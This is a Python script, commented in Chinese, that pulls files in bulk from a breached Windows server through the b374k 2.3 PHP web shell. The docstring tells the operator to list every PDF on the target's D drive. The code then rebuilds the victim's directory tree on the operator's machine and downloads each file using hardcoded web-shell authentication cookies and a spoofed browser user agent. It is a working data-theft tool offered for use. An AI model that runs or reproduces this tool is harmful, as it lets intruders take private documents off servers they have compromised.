'''
b374k2.3 鏡像下載windows檔案
1.目標cmd執行 chcp 65001 | dir "D:\*.pdf" /b /s >> filepath.txt
2.產出filepath.txt拖回本機 執行 python3 b374k2.3.py filepath.txt
3.依序產出資料夾並把目標個資料夾所屬資料鏡像抓回
'''

import os
from fake_useragent import UserAgent
import sys
import requests
from requests.packages.urllib3.exceptions import InsecureRequestWarning
import urllib.parse
import time
from multiprocessing import Pool
requests.packages.urllib3.disable_warnings()

def path_produce(filepath):#給filepath.txt產pwd.txt
    try:
        with open(filepath, 'r',encoding="UTF-8") as f:
            filedata = f.readlines()
        pwd=[]
        for i in filedata:
            slash=i.rfind('\\')
            pwd.append(i[0:slash]+"\n")
        f = open('pwd.txt','a+',encoding="UTF-8")
        for j in pwd:
            f.write("%s" % j)
        f.close()
        return True
    except:
        return False
        
def Folder_produce():#對應pwd.txt產出所有資料夾
    try:
        with open('pwd.txt', 'r',encoding="UTF-8") as f:
            mkdirbox = f.readlines()
        for i in mkdirbox:
            i=i.replace(':','').strip('\n')
            if not os.path.isdir(i):
                os.makedirs(i)
        return True
    except:
        return False

def download_file(url,filedata):#下載檔案
    ua = UserAgent()
    header = {'User-Agent':str(ua.chrome)}
    if requests.get(url = url,verify=False,headers=header).status_code == 200:
        try:
            slash=filedata.rfind('\\')
            pwd=filedata[0:slash]
            filename=filedata[slash+1:].strip('\n')
            pwd_encode=urllib.parse.quote(pwd,encoding='gbk')   
            filename_encode=urllib.parse.quote(filename,encoding='gbk')   
            filename=filedata.replace(':','').strip('\n')    
            ua = UserAgent()
            headers = {'User-Agent':str(ua.chrome), 'Referer':url, 'Connection':'close'} 
            cookie={'pass':'fb621f5060b9f65acf8eb4232e3024140dea2b34', 'cwd':pwd_encode+"%5C", 'b374k':'0de664ecd2be02cdd54234a0d1229b43'}
            data={'dltype':'raw', 'dlpath':filename_encode, 'd':pwd_encode+"%5C"}
            r=requests.post(url=url, headers=headers, cookies=cookie, data=data, verify=False)
            print(filename)
            open(filename, 'wb').write(r.content)
        except:
            print('下載失敗')
    else:
        print('b374k斷線')
        exit()

if __name__== "__main__":
    url=""#You b374k2.3
    filepath=sys.argv[1]
    
    if path_produce(filepath):
        if Folder_produce():
            os.remove("pwd.txt")
            print('資料夾建立完成')   
    
    with open(filepath, 'r',encoding="UTF-8") as f:
        filedata = f.readlines()    
    p = Pool()
    for fn in filedata:
        download_file(url,fn)
        #p.apply_async(download_file, args=(url,fn,))
    p.close()
    p.join()